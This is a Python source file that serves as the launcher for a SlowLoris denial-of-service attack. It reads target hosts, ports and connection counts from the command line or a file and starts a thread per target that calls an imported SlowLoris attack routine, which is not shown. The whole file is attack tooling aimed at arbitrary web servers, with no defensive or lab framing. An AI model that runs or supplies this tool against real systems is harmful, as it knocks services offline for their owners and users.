"""This module implements the SlowLoris DoS attack."""

# Standard imports
from os import path
import sys
import threading
import time

# Library imports
from slow_loris import SlowLoris

# Constants
DEFAULT_PORT = 80
DEFAULT_CONNECTION_COUNT = 200

def parsetarget(target):
    """Parses a target."""
    parts = target.split()
    part_len = len(parts)
    host = parts[0]
    port = DEFAULT_PORT
    count = DEFAULT_CONNECTION_COUNT
    if part_len == 2:
        port = int(parts[1])
    elif part_len == 3:
        port = int(parts[1])
        count = int(parts[2])
    return (host, port, count)

def main():
    """The main entry point."""
    if len(sys.argv) == 1:
        print("Error! Expected at least one argument after file path!")
        exit()
    # Holds a list of tuples in format (ip, port, count).
    targets = []
    # If the user gave us a file, hit all of the targets within.
    if path.isfile(sys.argv[1]):
        with open(sys.argv[1]) as file:
            lines = file.readlines()
        lines = [line.strip() for line in lines]
        for line in lines:
            targets.insert(0, parsetarget(line))
    else:
        targets.insert(0, parsetarget(' '.join(sys.argv[1:])))
    # Begin attacking our selected targets.
    try:
        loris = SlowLoris()
        # Spawn a new daemon thread for each attacker,
        # as it takes time to establish all the connections.
        for target in targets:
            attack_thread = threading.Thread(
                target=loris.attack,
                args=[target[0], target[1], target[2]])
            attack_thread.setDaemon(True)
            attack_thread.start()
            time.sleep(0.5)
        while True:
            pass
    except (KeyboardInterrupt, SystemExit):
        loris.stop()
        exit()

if __name__ == "__main__":
    main()
